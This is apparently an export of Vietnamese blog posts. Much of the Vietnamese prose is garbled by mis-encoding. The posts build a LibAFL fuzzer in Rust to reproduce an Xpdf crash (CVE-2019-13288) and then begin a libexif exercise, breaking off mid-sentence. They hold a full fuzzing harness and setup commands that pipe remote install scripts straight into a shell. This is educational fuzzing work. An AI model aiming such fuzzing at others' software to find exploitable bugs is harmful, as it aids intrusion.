thi·ªán t·ªëc ƒë·ªô fuzzing b·∫±ng c√°ch ngƒÉn ch·∫∑n n√≥ ti·∫øp c·∫≠n v√†o directory corpus.\nlet corpus_directory = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; Ti·∫øp theo, ch√∫ng ta kh√¥ng th·ªÉ truy·ªÅn file pdf m·ªôt c√°ch tr·ª±c ti·∫øp ƒë∆∞·ª£c m√† ph·∫£i c·∫ßn chuy·ªÉn n√≥ th√†nh d·∫°ng d·ªØ li·ªáu ph√π h·ª£p cho fuzzer. ·ªû ƒë√¢y m√¨nh s·∫Ω d√πng BytesInput ƒë·ªÉ fuzzer c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c input v√† x·ª≠ l√Ω n√≥.\nlet corpus_BytesInput = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); Output cho fuzzing hay g·ªçi c√°ch kh√°c ƒë√≥ ch√≠nh l√† \u0026ldquo;solutions\u0026rdquo;, n√≥ ch√≠nh l√† file pdf s·∫Ω g√¢y ra crash cho ch∆∞∆°ng tr√¨nh, hay n√≥i c√°ch kh√°c n·ªØa n√≥ ch√≠nh l√† PoC khi·∫øn cho ch∆∞∆°ng tr√¨nh r∆°i v√†o infinite recursion. M√¨nh s·∫Ω s·ª≠ d·ª•ng OnDiskCorpus ƒë·ªÉ l∆∞u c√°i PoC ƒë√≥ v√¥ trong corpus.\nlet crash_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./crash\u0026#34;)); V·∫≠y l√† ch√∫ng ta ƒë√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c input v√† output cho fuzzer.\n2nd Component: Observer # Theo trong libafl book th√¨ Observer l√† m·ªôt lo·∫°i component ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ cung c·∫•p c√°c th√¥ng tin trong qu√° tr√¨nh th·ª±c thi c·ªßa testcase hi·ªán t·∫°i ƒëang ƒë∆∞·ª£c fuzz. Trong concept c·ªßa forkserver_simple th√¨ m√¨nh s·∫Ω s·ª≠ d·ª•ng TimeObserver. Nh∆∞ m√¨nh ƒë√£ m√¥ t·∫£ v·ªÅ observer ·ªü tr√™n th√¨ TimeObserver n√≥ s·∫Ω l·∫•y d·ªØ li·ªáu v·ªÅ runtime cho testcase ƒëang ƒë∆∞·ª£c fuzz. M·ªói l·∫ßn fuzz th√¨ TimeObserver n√≥ s·∫Ω g·ª≠i gi√° tr·ªã v·ªÅ th·ªùi gian cho m·ªói l·∫ßn m√† testcase ƒë∆∞·ª£c th·ª±c thi th√¥ng qua Feedback component (t√≠ n·ªØa m√¨nh s·∫Ω n√≥i r√µ h∆°n v·ªÅ n√≥). V√≠ d·ª• m√¨nh c√≥ m·ªôt file pdf g·ªçi l√† x, v√† th·ªùi gian ƒë·ªÉ ch·∫°y file pdftotext x t·ªën 5 gi√¢y th√¨ TimeObserver s·∫Ω l·∫•y 5 gi√¢y ƒë√≥ th√¥ng qua Feedback component v√† g·ª≠i n√≥ cho fuzzer.\nlet timeObserver = TimeObserver::new(\u0026#34;time\u0026#34;); B√™n c·∫°nh TimeObserver th√¨ ch√∫ng ta c·∫ßn ph·∫£i c√≥ th√™m Coverage Map theo nh∆∞ trong concept c·ªßa forkserver_simple, Coverage Map s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ l√† coverage guided cho fuzzing, n√≥ s·∫Ω t·∫≠p trung v√†o t·ªëi ƒëa code coverage ƒë·ªÉ t√¨m ra l·ªó h·ªïng cho ch√∫ng ta. ƒê·ªÉ c√≥ th·ªÉ build Coverage Map th√¨ ch√∫ng ta c·∫ßn shared memory.\nƒê·∫ßu ti√™n th√¨ ch√∫ng ta c·∫ßn t·∫°o SharedMemProvider, n√≥ s·∫Ω cung c·∫•p quy·ªÅn truy c·∫≠p v√†o shared memory ƒë∆∞·ª£c mapping tr·ª±c ti·∫øp v√¥. Ch√∫ng ta s·ª≠ d·ª•ng unix shared memory trong AFL++.\nconst MAP_SIZE: usize = 65536; let mut shmem_provider = StdShMemProvider::new().unwrap(); let mut shmem = shmem_provider.new_shmem(MAP_SIZE).unwrap(); Coverage map s·∫Ω chia s·∫ª l·∫´n nhau gi·ªØa observer v√† executor. ƒê·ªÉ executor bi·∫øt ƒë∆∞·ª£c coverage map th√¨ m√¨nh s·∫Ω ghi shared memory id th√¨ m√¨nh s·∫Ω ghi n√≥ v√†o environment.\nshmem.write_to_env(\u0026#34;__AFL_SHM_ID\u0026#34;).unwrap(); Ti·∫øp theo ch√∫ng ta c·∫ßn ph·∫£i x·ª≠ l√Ω shared memory sao cho n√≥ c√≥ th·ªÉ thay ƒë·ªïi trong qu√° tr√¨nh fuzzing.\nlet shmem_buf = shmem.as_mut_slice(); V√† cu·ªëi c√πng m√¨nh s·∫Ω build Observer sau khi c√≥ ƒë∆∞·ª£c TimeObserver v√† ShareMemoryMap. V·ªõi Observer th√¨ m√¨nh ch·ªâ c·∫ßn ƒë∆∞a v√†o gi√° tr·ªã c·ªßa ShareMemoryMap v√† m√¨nh g·ªçi n√≥ l√† shared_mem (d·ª±a v√†o concept c·ªßa forkserver_simple).\nM√¨nh s·∫Ω s·ª≠ d·ª•ng HitCountsMapObserver. Theo nh∆∞ m√¥ t·∫£ trong libafl docs th√¨ HitCountsMapObserver c·∫ßn m·ªôt \u0026ldquo;base object\u0026rdquo; ƒë·ªÉ l√†m constructor, base object m√¨nh s·ª≠ d·ª•ng ƒë√≥ l√† MapObserver. Object n√†y s·∫Ω x√°c ƒë·ªãnh xem trong qu√° tr√¨nh fuzzing li·ªáu c√≥ testcase n√†o \u0026ldquo;suspicious\u0026rdquo; hay kh√¥ng.\nlet edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; Ch√∫ng ta ƒë√£ ho√†n th√†nh Observer, ƒëi ƒë·∫øn ph·∫ßn ti·∫øp theo.\n3rd Component: Feedback # Feedback n√≥ gi·ªëng nh∆∞ l√† output c·ªßa Observer, n√≥ s·∫Ω x√°c ƒë·ªãnh xem th·ª≠ c√≥ outcome n√†o \u0026ldquo;suspicious\u0026rdquo; t·ª´ observer hay kh√¥ng, n·∫øu nh∆∞ testcase ƒë√≥ c√≥ v·∫ª nh∆∞ l√† kh√¥ng ·ªïn th√¨ c√°i input ƒë∆∞·ª£c s·ª≠ d·ª•ng cho l·∫ßn fuzzing ƒë√≥ s·∫Ω ƒë∆∞·ª£c ƒë∆∞a v√†o Corpus. M√¨nh s·∫Ω t·∫°o Feedback d·ª±a tr√™n TimeObserver v√† CoverageMapObserver.\nlet mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;timeObserver) ); ƒêo·∫°n m√£ rust ·ªü tr√™n, ƒë·ªëi v·ªõi CoverageMapObserver th√¨ m√¨nh c√≥ s·ª≠ d·ª•ng MaxMapFeedback c√°i n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√°c ƒë·ªãnh output c·ªßa HitcountsMapObserver‚Äôs coverage map, n·∫øu nh∆∞ output c·ªßa HitcountsMapObserver l·ªõn h∆°n MAP_SIZE th√¨ ch·∫Øc ch·∫Øn input c·ªßa ch√∫ng ta c√≥ g√¨ ƒë√≥ khi·∫øn cho n√≥ nh∆∞ v·∫≠y. ƒê·ªëi v·ªõi TimeObserver th√¨ ƒë∆°n gi·∫£n m√¨nh s·ª≠ d·ª•ng TimeFeedback.\nV·ªõi hai Observer ·ªü tr√™n, ƒë·ªÉ k·∫øt h·ª£p c·∫£ hai l·∫°i m√¨nh s·ª≠ d·ª•ng logical OR, b·ªüi v√¨ m√¨nh ch·ªâ c·∫ßn m·ªôt trong hai c√°i ƒë√≥, n·∫øu nh∆∞ outputt c·ªßa HitcountsMapObserver l·ªõn h∆°n so v·ªõi entry c·ªßa n√≥ ho·∫∑c l√† TimeObserver l√¢u h∆°n so v·ªõi th√¥ng th∆∞·ªùng th√¨ c√≥ nghƒ©a l√† input c·ªßa ch√∫ng ta c√≥ th·ªÉ g√¢y l·ªói ch∆∞∆°ng tr√¨nh.\nSau khi ƒë√£ t√¨m ƒë∆∞·ª£c input c√≥ kh·∫£ nƒÉng g√¢y l·ªói cho ch∆∞∆°ng tr√¨nh th√¨ ch√∫ng ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh ch√≠nh x√°c xem input c√≥ th·ª±c s·ª± g√¢y crash cho file th·ª±c thi hay kh√¥ng. L·∫ßn n√†y thay v√¨ s·ª≠ d·ª•ng logical OR ƒë·ªÉ x√°c ƒë·ªãnh th√¨ m√¨nh s·∫Ω s·ª≠ d·ª•ng logical AND ƒë·ªÉ k·∫øt h·ª£p c·∫£ hai l·∫°i v·ªõi nhau, b·ªüi v√¨ m·ªôt input g√¢y crash cho ch∆∞∆°ng tr√¨nh th√¨ ch·∫Øc ch·∫Øn th·ªùi gian n√≥ s·∫Ω b·ªã timeout v√† input s·∫Ω khi·∫øn cho ch∆∞∆°ng tr√¨nh r·∫Ω sang m·ªôt h∆∞·ªõng code kh√°c trong coverage map.\nlet mut objective = feedback_and_fast!( // Must be a crash TimeoutFeedback::new(), // Take it only if trigger new coverage over crashes MaxMapFeedback::new(\u0026amp;edges_observer) Ch√∫ng ta di chuy·ªÉn t·ªõi component State\n4th Component: State # V·ªõi component l·∫ßn n√†y th√¨ m√¨nh s·∫Ω s·ª≠ d·ª•ng StdState. StdState s·∫Ω x√°c ƒë·ªãnh state cho fuzzer, random number generator, corpora.\nlet mut state = StdState::new( StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance corpus_BytesInput, // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer crash_corpus, // States of the feedbacks. // The feedbacks can report the data that should persist in the State. \u0026amp;mut feedback, // Same for objective feedbacks \u0026amp;mut objective, ) .unwrap(); 5th Component: Monitor # Monitor s·∫Ω theo d√µi to√†n b·ªô th√¥ng tin v√† ƒë∆∞a ra c√°ch ph√π h·ª£p nh·∫•t ƒë·ªÉ c√≥ th·ªÉ hi·ªÉn th·ªã c√°c th√¥ng tin ƒë√≥ cho ch√∫ng ta.\nM√¨nh s·∫Ω s·ª≠ d·ª•ng SimpleMonitor, n√≥ gi·ªëng nh∆∞ printf trong C. N√≥ s·∫Ω in ra c√°c th√¥ng tin cho ch√∫ng ta tr√™n terminal.\nlet monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); 6th Component: EventManager # Component n√†y t∆∞∆°ng t·ª± v·ªõi Monitor, n√≥ s·∫Ω x·ª≠ l√Ω c√°c Events trong qu√° tr√¨nh fuzzing, v√≠ d·ª• nh∆∞ l√† updating Monitor Component, logging v√† t√¨m c√°c testcase kh·∫£ nghi.\nSimplest Methods as always\nlet mut mgr = SimpleEventManager::new(monitor); 7th Component: Scheduler # Trong qu√° tr√¨nh fuzzing ch√∫ng ta c·∫ßn ph·∫£i ƒë∆∞a v√†o c√°c testcases kh√°c nhau t·ª´ corpus th√¨ Scheduler s·∫Ω ƒë·∫£m nh·∫≠n vai tr√≤ n√†y. N√≥ s·∫Ω t·∫°o ra c√°c testcase m·ªõi ph√π h·ª£p cho strategy c·ªßa fuzzer t·ª´ corpus. ƒê·ªÉ ∆∞u ti√™n c√°c testcase \u0026ldquo;nh·ªè, g·ªçn\u0026rdquo; ƒë·ªÉ t·ªëi ∆∞u th·ªùi gian fuzzing th√¨ m√¨nh s·ª≠ d·ª•ng strategy IndexesLenTimeMinimizerScheduler gi·ªëng nh∆∞ trong concept c·ªßa forkserver_simple.\nlet scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); 8th Component: Fuzzer # ƒê·ªëi v·ªõi component n√†y m√¨nh ch·ªçn TimeoutForkserverExecutor. \u0026ldquo;Timeout forkserver\u0026rdquo; bao b·ªçc quanh tr√¨nh th·ª±c thi standard ForkserverExecutor v√† thi·∫øt l·∫≠p m·ªôt th·ªùi gian ch·ªù tr∆∞·ªõc m·ªói l·∫ßn ch·∫°y. C√≥ nghƒ©a tr∆∞·ªõc khi ch·∫°y th√¨ n√≥ s·∫Ω set timeout ƒë·ªÉ c√≥ th·ªÉ fork m·ªôt process kh√°c ƒë·ªÉ fuzz.\nCh√∫ng ta c·∫ßn ph·∫£i ch·ªâ ra nh·ªØng g√¨ m√† ch√∫ng ta mu·ªën th·ª±c thi cho Executor. ·ªû ƒë√¢y ƒë√≥ l√†\nexercise-1/xpdf/xpdf/install/bin/pdftotext PDF-FILE let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); let mut forkserver = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) //L√≠ do c√≥ @@ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† ch·ªâ ƒë·ªãnh cho ForkserverExecutor r·∫±ng ch√∫ng ta s·ª≠ d·ª•ng BytesInput .coverage_map_size(MAP_SIZE) .build(tuple_list!(timeObserver, edges_observer)) .unwrap(); let timeout = Duration::from_secs(5); //Ch√∫ng ta set timeout 5 gi√¢y let mut executor = TimeoutForkserverExecutor::new(forkserver, timeout).unwrap(); V√† ch√∫ng ta ƒëi t·ªõi component cu·ªëi c√πng: Mutator + Stage\n9th Component: Mutator + Stage # Mutator nh∆∞ trong docs n√≥i th√¨ n√≥ ƒë∆°n gi·∫£n ch·ªâ nh·∫≠n input v√†o v√† mutate n√≥. V√† ƒë·ªÉ ch·ªçn cho mutational stage th√¨ m√¨nh s·ª≠ d·ª•ng Havoc Mutation.\nlet mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); main.rs\nuse core::time::Duration; use std::path::PathBuf; use libafl::{ corpus::{Corpus, InMemoryCorpus, OnDiskCorpus}, events::SimpleEventManager, executors::{ForkserverExecutor, TimeoutForkserverExecutor}, feedback_and_fast, feedback_or, Error, Fuzzer, StdFuzzer, feedbacks::{MaxMapFeedback, TimeFeedback, TimeoutFeedback}, inputs::BytesInput, monitors::SimpleMonitor, mutators::{havoc_mutations, StdScheduledMutator}, observers::{HitcountsMapObserver, StdMapObserver, TimeObserver}, schedulers::{IndexesLenTimeMinimizerScheduler, QueueScheduler}, stages::mutational::StdMutationalStage, state::{HasCorpus, StdState}, }; use libafl::bolts::{ current_nanos, rands::StdRand, shmem::{ShMem, ShMemProvider, StdShMemProvider}, tuples::{tuple_list, MatchName, Merge}, AsMutSlice, Truncate, }; const MAP_SIZE: usize = 65536; fn main() -\u0026gt; Result\u0026lt;(), Error\u0026gt; { let corpus_directory = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; let corpus_BytesInput = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); let crash_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./crash\u0026#34;))?; let time_observer = TimeObserver::new(\u0026#34;time\u0026#34;); let mut shmem_provider = StdShMemProvider::new().unwrap(); let mut shmem = shmem_provider.new_shmem(MAP_SIZE).unwrap(); shmem.write_to_env(\u0026#34;__AFL_SHM_ID\u0026#34;).unwrap(); let shmem_buf = shmem.as_mut_slice(); let edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; let mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;time_observer) ); let mut objective = feedback_and_fast!( // Must be a crash TimeoutFeedback::new(), // Take it only if trigger new coverage over crashes // Uses `with_name` to create a different history from the `MaxMapFeedback` in `feedback` above MaxMapFeedback::new(\u0026amp;edges_observer) ); let mut state = StdState::new( StdRand::with_seed(current_nanos()), // Corpus that will be evolved, we keep it in memory for performance corpus_BytesInput, // Corpus in which we store solutions (crashes in this example), // on disk so the user can get them after stopping the fuzzer crash_corpus, // States of the feedbacks. // The feedbacks can report the data that should persist in the State. \u0026amp;mut feedback, // Same for objective feedbacks \u0026amp;mut objective, ) .unwrap(); let monitor = SimpleMonitor::new(|s| println!(\u0026#34;{s}\u0026#34;)); let mut mgr = SimpleEventManager::new(monitor); let scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); let mut forkserver = ForkserverExecutor::builder() .program(\u0026#34;./xpdf/install/bin/pdftotext\u0026#34;) .parse_afl_cmdline([\u0026#34;@@\u0026#34;]) //L√≠ do c√≥ @@ ·ªü ƒë√¢y ƒë√≥ ch√≠nh l√† ch·ªâ ƒë·ªãnh cho ForkserverExecutor r·∫±ng ch√∫ng ta s·ª≠ d·ª•ng BytesInput .coverage_map_size(MAP_SIZE) .build(tuple_list!(time_observer, edges_observer)) .unwrap(); let timeout = Duration::from_secs(5); //Ch√∫ng ta set timeout 5 gi√¢y let mut executor = TimeoutForkserverExecutor::new(forkserver, timeout).unwrap(); if state.corpus().count() \u0026lt; 1 { state .load_initial_inputs(\u0026amp;mut fuzzer, \u0026amp;mut executor, \u0026amp;mut mgr, \u0026amp;corpus_directory) .unwrap_or_else(|err| { panic!( \u0026#34;Failed to load initial corpus at {:?}: {:?}\u0026#34;, \u0026amp;corpus_directory, err ) }); println!(\u0026#34;We imported {} inputs from disk.\u0026#34;, state.corpus().count()); } let mutator = StdScheduledMutator::new(havoc_mutations()); let mut stages = tuple_list!(StdMutationalStage::new(mutator)); fuzzer .fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr) .expect(\u0026#34;Error in the fuzzing loop\u0026#34;); Ok(()) } Fuzz\u0026rsquo;em All # Sau khi ƒë√£ ho√†n th√†nh build c√°c component th√¨ ch√∫ng ta th·ª±c hi·ªán fuzz. Trong fuzzer th√¨ ch√∫ng ta s·∫Ω truy·ªÅn v√†o c√°c component c·∫ßn thi·∫øt nh∆∞ l√†: stages, executor, state, event manager.\nfuzzer .fuzz_loop(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr) .expect(\u0026#34;Error in the fuzzing loop\u0026#34;); Build fuzzer # B·ªüi v√¨ trong file Makefile.toml m√¨nh ƒë√£ ƒë∆∞a v√†o task cargo build n√™n n√≥ s·∫Ω t·ª± ƒë·ªông ch·∫°y fuzzing cho m√¨nh.\ncd ~/fuzzing-101/exercise-1 cargo build --release Sau khi build xong th√¨ file th·ª±c thi\nAnd the magic happen # ../target/release/exercise-one-solution Result\n[Testcase #0] run time: 0h-15m-18s, clients: 1, corpus: 1230, objectives: 1, executions: 666438, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1230, objectives: 1, executions: 666835, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1230, objectives: 1, executions: 666835, exec/sec: 725.3 [Testcase #0] run time: 0h-15m-19s, clients: 1, corpus: 1231, objectives: 1, executions: 667085, exec/sec: 725.6 [Stats #0] run time: 0h-15m-19s, clients: 1, corpus: 1231, objectives: 1, executions: 667085, exec/sec: 725.4 [Testcase #0] run time: 0h-15m-19s, clients: 1, corpus: 1232, objectives: 1, executions: 667180, exec/sec: 725.5 [Stats #0] run time: 0h-15m-21s, clients: 1, corpus: 1232, objectives: 1, executions: 667180, exec/sec: 723.7 [Testcase #0] run time: 0h-15m-21s, clients: 1, corpus: 1233, objectives: 1, executions: 668717, exec/sec: 725.4 [Stats #0] run time: 0h-15m-30s, clients: 1, corpus: 1233, objectives: 1, executions: 668717, exec/sec: 718.6 [Testcase #0] run time: 0h-15m-30s, clients: 1, corpus: 1234, objectives: 1, executions: 675056, exec/sec: 725.5 [Stats #0] run time: 0h-15m-34s, clients: 1, corpus: 1234, objectives: 1, executions: 677239, exec/sec: 725.0 Sample g√¢y crash ƒë∆∞·ª£c t·∫°o ra t·ª´ fuzzer ./xpdf/install/bin/pdftotext crash/067cae960270b247 Conclusion # Sau khi ch·∫°y c·ª° 15p (t√πy m√°y) th√¨ ƒë√£ c√≥ 1 file ƒë·∫°t ƒë∆∞·ª£c m·ª•c ƒë√≠ch c·ªßa ch√∫ng ta v·ªõi b·∫±ng ch·ª©ng l√† objectives: 1 ƒë∆∞·ª£c in ra t·ª´ component Monitor. M√¨nh nghƒ© l√† c√≥ c√°ch ƒë·ªÉ t·ªëi ∆∞u th·ªùi gian h∆°n, m√¨nh t√¨m hi·ªÉu th√¨ s·ª≠ d·ª•ng afl-clang-cto thay v√¨ afl-clang-fast v√† s·ª≠ d·ª•ng in-process executor thay v√¨ l√† forkserver.\nN·∫øu nh∆∞ b·∫°n c√≥ c√¢u h·ªèi th√¨ hay dm cho m√¨nh\nTwitter: @y198_nt Discord: y198#6338\nThank you for reading ü´∂\n","date":"27 November 2023","externalUrl":null,"permalink":"/posts/fuzzing_holy_bible_chapter1/","section":"Posts","summary":"Using LibAFL fuzzer to reproduce CVE-2019-13288","title":"LibAFL Fuzzing Holy Bible - Chapter I: Fuzzing Xpdf - CVE-2019-13288","type":"posts"},{"content":" tags: libafl # Background # Antonio Morales ƒë√£ t·∫°o m·ªôt c√°i repo Fuzzing 101 v·ªõi m·ª•c ƒë√≠ch l√† t·∫°o ra c√°c challenge li√™n quan ƒë·∫øn nh·ªØng ki·∫øn th·ª©c v√† basic skill c·ªßa fuzzing d√†nh cho nh·ªØng ai mu·ªën h·ªçc n√≥ v√† s·ª≠ d·ª•ng n√≥ ƒë·ªÉ t√¨m ra c√°c vulnerabilities. Repo n√†y t·∫≠p trung v√†o c√°ch s·ª≠ d·ª•ng c·ªßa AFL++ nh∆∞ng trong series m√¨nh vi·∫øt v·ªõi m·ª•c ƒë√≠ch l√† solve nh·ªØng challenge s·ª≠ d·ª•ng LibAFL thay v√¨ l√† AFL++.\nTrong series n√†y th√¨ m√¨nh s·∫Ω t√¨m hi·ªÉu c√°c th∆∞ vi·ªán v√† vi·∫øt fuzzers b·∫±ng ng√¥n ng·ªØ Rust, m√¨nh s·∫Ω c·ªë g·∫Øng solve c√°c challenges g·∫ßn gi·ªëng v·ªõi solution nh·∫•t m√† m√¨nh c√≥ th·ªÉ l√†m ƒë∆∞·ª£c.\nV√† trong series n√†y m√¨nh s·∫Ω s·ª≠ d·ª•ng ng√¥n ng·ªØ Rust ƒë·ªÉ vi·∫øt fuzzers. N·∫øu nh∆∞ b·∫°n ch∆∞a bi·∫øt Rust v√† Fuzzers l√† g√¨ th√¨ m√¨nh khuy·∫øn kh√≠ch b·∫°n n√™n t√¨m hi·ªÉu v·ªÅ n√≥ tr∆∞·ªõc khi ƒë·ªçc nh·ªØng g√¨ ti·∫øp theo.\nAbout LibAFL # LibAFL l√† m·ªôt s·ª± c·∫£i ti·∫øn t·ª´ AFL++ ƒë∆∞·ª£c vi·∫øt b·∫±ng ng√¥n ng·ªØ Rust. N√≥ nhanh h∆°n, ƒëa d·∫°ng n·ªÅn t·∫£ng, no_std compatibles v√† n√≥ t·∫≠n d·ª•ng t·ªët ngu·ªìn t√†i nguy√™n c·ªßa m√°y.\nƒê·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ LibAFL b·∫°n c√≥ th·ªÉ coi c√°i n√†y Fuzzers Like Lego @rC3\nPrequesite # Rust installation: # curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nAFL++ installation: # Dependencies: sudo apt-get update sudo apt-get install -y python3-pip cmake build-essential git gcc sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode Build AFL++: git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-15\u0026#34; make distrib sudo make install N·∫øu nh∆∞ b·∫°n g·∫∑p l·ªói v·ªõi unicornafl th√¨ h√£y th·ª≠ downgrade version c·ªßa python xu·ªëng 3.10.8.\ncurl https://pyenv.run | bash pyenv install 3.10.8 pyenv global 3.10.8 Test installation: cd ~ export PATH=$PATH :~/AFLplusplus afl-fuzz -h Result:\ngh0st@pl4y-Gr0und:~$ afl-fuzz -h afl-fuzz++4.09a based on afl by Michal Zalewski and a large online community afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters: -i dir - input directory with test cases (or \u0026#39;-\u0026#39; to resume, also see AFL_AUTORESUME) -o dir - output directory for fuzzer findings Execution control settings: -P strategy - set fix mutation strategy: explore (focus on new coverage), exploit (focus on triggering crashes). You can also set a number of seconds after without any finds it switches to exploit mode, and back on new coverage (default: 1000) -p schedule - power schedules compute a seed\u0026#39;s performance score: fast(default), explore, exploit, seek, rare, mmopt, coe, lin quad -- see docs/FAQ.md for more information -f file - location read by the fuzzed program (default: stdin or @@) -t msec - timeout for each run (auto-scaled, default 1000 ms). Add a \u0026#39;+\u0026#39; to auto-calculate the timeout, the value being the maximum. -m megs - memory limit for child process (0 MB, 0 = no limit [default]) -O - use binary-only instrumentation (FRIDA mode) -Q - use binary-only instrumentation (QEMU mode) -U - use unicorn-based instrumentation (Unicorn mode) -W - use qemu-based instrumentation with Wine (Wine mode) -X - use VM fuzzing (NYX mode - standalone mode) -Y - use VM fuzzing (NYX mode - multiple instances mode) Mutator settings: -a - target input format, \u0026#34;text\u0026#34; or \u0026#34;binary\u0026#34; (default: generic) -g minlength - set min length of generated fuzz input (default: 1) -G maxlength - set max length of generated fuzz input (default: 1048576) -D - enable deterministic fuzzing (once per queue entry) -L minutes - use MOpt(imize) mode and set the time limit for entering the pacemaker mode (minutes of no new finds). 0 = immediately, -1 = immediately and together with normal mutation. Note: this option is usually not very effective -c program - enable CmpLog by specifying a binary compiled for it. if using QEMU/FRIDA or the fuzzing target is compiled for CmpLog then use \u0026#39;-c 0\u0026#39;. To disable Cmplog use \u0026#39;-c -\u0026#39;. -l cmplog_opts - CmpLog configuration values (e.g. \u0026#34;2ATR\u0026#34;): 1=small files, 2=larger files (default), 3=all files, A=arithmetic solving, T=transformational solving, X=extreme transform solving, R=random colorization bytes. Fuzzing behavior settings: -Z - sequential queue selection instead of weighted random -N - do not unlink the fuzzing input file (for devices etc.) -n - fuzz without instrumentation (non-instrumented mode) -x dict_file - fuzzer dictionary (see README.md, specify up to 4 times) Test settings: -s seed - use a fixed seed for the RNG -V seconds - fuzz for a specified time then terminate -E execs - fuzz for an approx. no. of total executions then terminate Note: not precise and can have several more executions. Other stuff: -M/-S id - distributed mode (-M sets -Z and disables trimming) see docs/fuzzing_in_depth.md#c-using-multiple-cores for effective recommendations for parallel fuzzing. -F path - sync to a foreign fuzzer queue directory (requires -M, can be specified up to 32 times) -T text - text banner to show on the screen -I command - execute this command/script when a new crash is found -C - crash exploration mode (the peruvian rabbit thing) -b cpu_id - bind the fuzzing process to the specified CPU core (0-...) -e ext - file extension for the fuzz test input file (if needed) To view also the supported environment variables of afl-fuzz please use \u0026#34;-hh\u0026#34;. Compiled with Python 3.11.4 module support, see docs/custom_mutators.md Compiled without AFL_PERSISTENT_RECORD support. Compiled with shmat support. For additional help please consult docs/README.md :) Objective # ·ªû chapter l·∫ßn n√†y t∆∞∆°ng ·ª©ng v·ªõi exercise-2 trong Fuzzing 101. M·ª•c ƒë√≠ch c·ªßa exercise n√†y ƒë√≥ l√† ch√∫ng ta c·∫ßn ph·∫£i t√¨m m·ªôt c√°i PoC/crash cho CVE-2009-3895 \u0026amp; CVE-2012-2836.\nCVE-2009\nHeap-based buffer overflow in the exif_entry_fix function (aka the tag fixup routine) in libexif/exif-entry.c in libexif 0.6.18 allows remote attackers to cause a denial of service or possibly execute arbitrary code via an invalid EXIF image. NOTE: some of these details are obtained from third party information.\nCVE-2012-2836\nThe exif_data_load_data function in exif-data.c in the EXIF Tag Parsing Library (aka libexif) before 0.6.21 allows remote attackers to cause a denial of service (out-of-bounds read) or possibly obtain sensitive information from process memory via crafted EXIF tags in an image.\nBefore Fuzzing # Tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu fuzzing ch√∫ng ta c·∫ßn ph·∫£i chu·∫©n b·ªã m·ªôt s·ªë th·ª©\nSetup our target # gh0st@fuzzing-bible:~/fuzzing-101-solutions$ cargo new --lib exercise-2 Ch√∫ng ta update member cho file Cargo.toml g·ªëc\nfuzzing-101-solutions/Cargo.toml\n[workspace] members = [ \u0026#34;exercise-1\u0026#34;, \u0026#34;exercise-2\u0026#34;, ] Install libexif # gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ tar -xvf libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ rm libexif-0_6_14-release.tar.gz gh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ mv libexif-libexif-0_6_14-release libexif Install requirements\ngh0st@fuzzing-bible:~/fuzzing-101-solutions/exercise-2$ sudo apt-get install autopoint libtool gettext libpopt-dev Build our target # L·∫ßn n√†y m√¨nh ti·∫øp t·ª•c s·ª≠ d·ª•ng 